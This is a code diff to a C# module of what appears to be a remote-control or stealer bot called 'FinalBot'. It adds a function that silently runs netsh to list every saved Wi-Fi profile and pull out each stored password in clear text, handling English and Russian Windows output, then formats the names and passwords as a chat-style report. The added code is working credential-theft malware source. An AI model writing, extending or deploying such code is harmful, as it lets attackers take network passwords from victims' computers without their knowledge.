@@ -7,6 +7,9 @@ using Microsoft.Win32;
 using System.Net.Http;
 using Newtonsoft.Json.Linq;
 using System.Linq;
+using System.Diagnostics;
+using System.Text.RegularExpressions;
+using System.Collections.Generic;
 
 namespace FinalBot.Modules
 {
@@ -165,6 +168,67 @@ namespace FinalBot.Modules
             }
             catch { }
             return "Unknown";
+        }
+
+        public static string GetWifiProfiles()
+        {
+            var sb = new StringBuilder();
+            sb.AppendLine("📶 *WIFI PROFILES*");
+            try
+            {
+                var proc = new Process
+                {
+                    StartInfo = new ProcessStartInfo
+                    {
+                        FileName = "netsh",
+                        Arguments = "wlan show profiles",
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true,
+                        CreateNoWindow = true
+                    }
+                };
+                proc.Start();
+                string output = proc.StandardOutput.ReadToEnd();
+                proc.WaitForExit();
+
+                var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
+                foreach (var line in lines)
+                {
+                    if (line.Contains(":") && (line.Contains("All User Profile") || line.Contains("Все профили пользователей")))
+                    {
+                        string name = line.Split(':')[1].Trim();
+                        if (string.IsNullOrEmpty(name)) continue;
+
+                        var p2 = new Process
+                        {
+                            StartInfo = new ProcessStartInfo
+                            {
+                                FileName = "netsh",
+                                Arguments = $"wlan show profile name=\"{name}\" key=clear",
+                                UseShellExecute = false,
+                                RedirectStandardOutput = true,
+                                CreateNoWindow = true
+                            }
+                        };
+                        p2.Start();
+                        string out2 = p2.StandardOutput.ReadToEnd();
+                        p2.WaitForExit();
+
+                        string pass = "None";
+                        var m = Regex.Match(out2, "Key Content\\s+:\\s+(.*)");
+                        if (m.Success) pass = m.Groups[1].Value.Trim();
+                        else
+                        {
+                            m = Regex.Match(out2, "Содержимое ключа\\s+:\\s+(.*)"); 
+                            if (m.Success) pass = m.Groups[1].Value.Trim();
+                        }
+
+                        sb.AppendLine($"📡 `{name}` : `{pass}`");
+                    }
+                }
+            }
+            catch (Exception ex) { sb.AppendLine($"❌ Error: {ex.Message}"); }
+            return sb.ToString();
         }
     }
 }
